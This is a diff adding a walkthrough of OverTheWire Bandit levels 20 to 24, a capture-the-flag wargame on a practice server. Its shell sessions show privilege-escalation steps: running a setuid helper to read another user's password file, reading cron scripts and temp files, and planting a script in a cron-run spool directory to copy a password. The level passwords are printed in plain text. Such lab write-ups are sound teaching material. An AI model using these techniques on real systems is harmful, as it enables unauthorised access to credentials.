@@ -299,5 +299,183 @@ IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x                     # bandit19's password.
 ```bash
 $ ssh bandit19@bandit.labs.overthewire.org -p 2220
 
+# Can't access as bandit19
+bandit19@bandit:~$ cat /etc/bandit_pass/bandit20
+cat: /etc/bandit_pass/bandit20: Permission denied
+
+# bandit20 is owner, with read access.
+bandit19@bandit:~$ stat -c "%U %u %A" /etc/bandit_pass/bandit20
+bandit20 11020 -r--------
+
+# find bandit20-do's usage.
+bandit19@bandit:~$ ./bandit20-do
+Run a command as another user.
+  Example: ./bandit20-do id
+
+# Get the password
+bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j                     # bandit20's password.
+```
+
+
+### [bandit21](https://overthewire.org/wargames/bandit/bandit21.html)
+```bash
+$ ssh bandit20@bandit.labs.overthewire.org -p 2220
+
+# find suconnect's usage.
+bandit20@bandit:~$ ./suconnect
+Usage: ./suconnect <portnumber>
+This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
+
+# create first window
+bandit20@bandit:~$ tmux new -s "A"
+bandit20@bandit:~$ nc -lvp 1234
+listening on [any] 1234 ...
+
+# ctrl+b, d to detach. create another window:
+bandit20@bandit:~$ tmux new -s "B"
+bandit20@bandit:~$ ./suconnect 1234
+
+# ctrl+b, s, choose 'A' window & paste bandit 20 password:
+bandit20@bandit:~$ nc -lvp 1234
+listening on [any] 1234 ...
+connect to [127.0.0.1] from localhost [127.0.0.1] 58114
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j                     # bandit20's pasted password.
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr                     # bandit21's password.
+
+# ctrl+b, s, choose 'B' window:
+bandit20@bandit:~$ ./suconnect 1234
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+
+# killing tmux:
+bandit20@bandit:~$ tmux ls
+A: 1 windows (created Thu Aug 11 23:02:31 2022) [120x29]
+B: 1 windows (created Thu Aug 11 23:03:19 2022) [120x29]
+bandit20@bandit:~$ tmux kill-server
+bandit20@bandit:~$ tmux ls
+no server running on /tmp/tmux-11020/default
+```
+
+
+### [bandit22](https://overthewire.org/wargames/bandit/bandit22.html)
+```bash
+$ ssh bandit21@bandit.labs.overthewire.org -p 2220
+
+bandit21@bandit:~$ file /etc/cron.d/*
+/etc/cron.d/cronjob_bandit15_root: ASCII text
+/etc/cron.d/cronjob_bandit17_root: ASCII text
+/etc/cron.d/cronjob_bandit22:      ASCII text
+/etc/cron.d/cronjob_bandit23:      ASCII text
+/etc/cron.d/cronjob_bandit24:      ASCII text
+/etc/cron.d/cronjob_bandit25_root: ASCII text
+
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI                     # bandit22's password.
+```
+
+
+### [bandit23](https://overthewire.org/wargames/bandit/bandit23.html)
+```bash
+$ ssh bandit22@bandit.labs.overthewire.org -p 2220
+
+bandit22@bandit:~$ file /etc/cron.d/*
+/etc/cron.d/cronjob_bandit15_root: ASCII text
+/etc/cron.d/cronjob_bandit17_root: ASCII text
+/etc/cron.d/cronjob_bandit22:      ASCII text
+/etc/cron.d/cronjob_bandit23:      ASCII text
+/etc/cron.d/cronjob_bandit24:      ASCII text
+/etc/cron.d/cronjob_bandit25_root: ASCII text
+
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+# The following line was automatically suggested by github copilot before I even tried to understand the script above. What a time to be alive.
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+# Anyway, executing /usr/bin/cronjob_bandit23.sh will yield the same result:
+bandit22@bandit:~$ /usr/bin/cronjob_bandit23.sh
+Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
+
+# so we just have to read the generated file:
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n                     # bandit23's password.
+```
+
+
+### [bandit24](https://overthewire.org/wargames/bandit/bandit24.html)
+```bash
+$ ssh bandit23@bandit.labs.overthewire.org -p 2220
+
+bandit23@bandit:~$ file /etc/cron.d/*
+/etc/cron.d/cronjob_bandit15_root: ASCII text
+/etc/cron.d/cronjob_bandit17_root: ASCII text
+/etc/cron.d/cronjob_bandit22:      ASCII text
+/etc/cron.d/cronjob_bandit23:      ASCII text
+/etc/cron.d/cronjob_bandit24:      ASCII text
+/etc/cron.d/cronjob_bandit25_root: ASCII text
+
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+bandit23@bandit:~$ cat bandit24 /usr/bin/cronjob_bandit24.sh
+cat: bandit24: No such file or directory
+#!/bin/bash
+myname=$(whoami)
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+# we need to create our own script and copy it to /var/spool/bandit24.
+bandit23@bandit:~$ mkdir /tmp/12082022
+bandit23@bandit:~$ cd /tmp/12082022
+bandit23@bandit:/tmp/12082022$ touch password
+bandit23@bandit:/tmp/12082022$ chmod 666 password     # rw for all
+bandit23@bandit:/tmp/12082022$ vim script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/12082022/password
+
+bandit23@bandit:/tmp/12082022$ chmod 777 script.sh    # rwx for all
+bandit23@bandit:/tmp/12082022$ cp script.sh /var/spool/bandit24/
+
+# script will be executed after 60 seconds..
+bandit23@bandit:/tmp/12082022$ cat password
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ                     # bandit24's password.
+``` 
+
+
+### [bandit25](https://overthewire.org/wargames/bandit/bandit25.html)
+```bash
+$ ssh bandit24@bandit.labs.overthewire.org -p 2220
+
 # TBD
 ```
